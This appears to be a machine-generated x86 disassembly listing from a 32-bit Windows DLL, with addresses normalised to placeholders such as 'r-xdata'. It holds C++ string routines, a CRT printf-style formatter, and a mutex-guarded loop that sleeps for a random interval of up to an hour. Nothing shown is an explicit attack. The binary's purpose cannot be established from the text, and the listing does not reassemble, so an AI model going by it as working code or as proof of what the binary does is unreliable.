mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] 0x0
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] 0x0
sub_10050540
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0xc ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_1002d84e
test ecx ecx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0xc ]
add ecx ebx
push ecx
push eax
call sub_1007ec90
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add esp 0xc
push eax
push ecx
push ebx
mov ecx esi
call sub_1002b340
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10050640
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_100383c6
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_1006299d
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_10050690
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10089cbe
mov eax [ fs : 0x0 ]
push eax
sub esp 0x438
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x430 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x448 ]
mov [ fs : 0x0 ] eax
mov ebx [ GetProcessHeap@IAT ]
push 0x11
push 0x8
call ebx
mov edi [ HeapAlloc@IAT ]
push eax
call edi
mov esi eax
mov eax [ r--data ]
mov [ esi ] eax
mov ecx [ r--data ]
mov [ esi + 0x4 ] ecx
mov edx [ r--data ]
mov [ esi + 0x8 ] edx
mov ax [ r--data ]
mov [ esi + 0xc ] ax
mov cl [ r--data ]
push 0xc
push 0x8
mov [ esi + 0xe ] cl
call ebx
push eax
call edi
mov edx [ r--data ]
mov edi eax
mov [ edi ] edx
mov eax [ r--data ]
mov [ edi + 0x4 ] eax
mov ecx [ r--data ]
push 0x4
push 0x0
mov [ edi + 0x8 ] ecx
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x450 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xec ] 0x0
jne r-xdata
push esi
push eax
call ebx
mov esi [ HeapFree@IAT ]
push eax
call esi
push edi
push 0x0
call ebx
push eax
call esi
mov eax 0x3f2
mov ecx [ esp + 0x448 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x430 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov [ esp + 0x450 ] 0xffffffff
test eax eax
jne r-xdata
lea edx [ esp + 0x24 ]
push edx
call sub_10065cb8
mov eax [ esp + 0x28 ]
xor edx edx
mov ecx 0x36ee80
div ecx
add esp 0x4
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ eax + 0xf4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x450 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0x4 ]
lea esi [ eax + 0x4 ]
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esi ]
mov edx eax
sub edx ecx
push sub_10062b50
sar edx 0x2
push edx
push eax
push ecx
call sub_1001f500
mov eax [ esi ]
mov ecx [ eax ]
mov al [ ecx + 0x3e ]
add esp 0x10
xor al al
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
xor esi esi
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
cmp edi ebx
je r-xdata
inc al
movzx edx al
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_1006f000
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov esi edi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
xor esi esi
mov [ eax + 0xe8 ] esi
mov [ eax + 0xf0 ] esi
mov [ eax + 0xec ] 0x1
mov eax [ eax + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
jmp r-xdata
mov ecx edi
call sub_10014f20
lea ecx [ esp + 0x3bc ]
push ecx
call sub_1003bb10
mov ebx eax
lea edx [ esp + 0x2bc ]
push edx
mov [ esp + 0x454 ] 0x2
call sub_1003bb10
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x1bc ]
push eax
mov [ esp + 0x454 ] 0x3
call sub_1003bb10
mov [ esp + 0x28 ] eax
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0x454 ] 0x4
call sub_1003bb10
mov esi eax
lea edx [ esp + 0x23c ]
push edx
mov [ esp + 0x454 ] 0x5
call sub_1003bb10
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x33c ]
push eax
mov [ esp + 0x454 ] 0x6
call sub_1003bb10
mov [ esp + 0x2c ] eax
lea ecx [ esp + 0x13c ]
push ecx
mov [ esp + 0x454 ] 0x7
call sub_1003bb10
mov [ esp + 0x30 ] eax
lea edx [ esp + 0x3c ]
push edx
mov [ esp + 0x454 ] 0x8
call sub_1003bb10
lea ecx [ esi + 0x58 ]
mov esi 0x8
mov [ esp + 0x450 ] 0x9
cmp [ ecx + 0x14 ] esi
jb r-xdata
push edi
call sub_100187af
add esp 0x4
xor esi esi
call sub_1002fbb0
sub esi 0xffffff80
cmp esi ebx
jne r-xdata
mov [ esp + 0x450 ] 0xffffffff
cmp edi esi
je r-xdata
mov edx [ esp + 0x34 ]
add edx 0x3c
cmp [ edx + 0x14 ] esi
jb r-xdata
mov ecx [ ecx ]
mov esi [ esp + 0x30 ]
add esi 0x1c
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx [ edx ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov esi [ esi ]
mov ebx [ ebx + 0x7c ]
push ebx
mov ebx [ esp + 0x3c ]
mov ebx [ ebx + 0x78 ]
push ebx
mov ebx [ esp + 0x30 ]
movzx ebx [ ebx + 0x74 ]
push ebx
push ecx
push edx
push eax
mov eax [ esp + 0x44 ]
mov dx [ eax + 0x38 ]
mov ecx esi
call sub_1006d0d0
lea esi [ esp + 0x3c ]
mov [ esp + 0x450 ] 0x8
call sub_1002fbb0
lea esi [ esp + 0x13c ]
mov [ esp + 0x450 ] 0x7
call sub_1002fbb0
lea esi [ esp + 0x33c ]
mov [ esp + 0x450 ] 0x6
call sub_1002fbb0
lea esi [ esp + 0x23c ]
mov [ esp + 0x450 ] 0x5
call sub_1002fbb0
lea esi [ esp + 0xbc ]
mov [ esp + 0x450 ] 0x4
call sub_1002fbb0
lea esi [ esp + 0x1bc ]
mov [ esp + 0x450 ] 0x3
call sub_1002fbb0
lea esi [ esp + 0x2bc ]
mov [ esp + 0x450 ] 0x2
call sub_1002fbb0
lea esi [ esp + 0x3bc ]
mov [ esp + 0x450 ] 0x1
call sub_1002fbb0
sub edi 0xffffff80
cmp edi [ esp + 0x18 ]
jne r-xdata
mov eax [ eax ]
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
sub_10050ad0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ff0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] edi
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
call sub_10022e20
mov [ ebp - 0x18 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
cmp edx esi
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
push ebx
push esi
push edx
call eax
add [ edi + 0x8 ] eax
mov ecx edx
adc [ edi + 0xc ] ecx
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
cmp ecx esi
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov [ ebp - 0x14 ] 0x3
cmp ecx ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
push esi
call sub_1001bdc0
or eax 0x4
xor esi esi
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub_10050b76
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_1001bdc0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10050c05
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_1001da0a
call sub_1006299d
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_100517ad ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_1007fb79
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_10035d06
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_1007fba8
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_10066f2d
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10046d02
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_1007fba8
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1007fb79
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_1002fb6b
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_100823c0
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_1007fb79
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_1007fb79
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_1007fa90
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_10046d02
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1007fb79
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_100517e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push esi
push edi
mov esi ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
sub eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002d84e
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_1000831a
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
lea ebx [ eax + edi ]
push 0x0
push ebx
mov ecx esi
call sub_1001eb83
test al al
je r-xdata
pop ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea edx [ edi + edi ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_10051890
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x230 ]
push eax
push ebx
mov [ ebp - 0x22c ] ebx
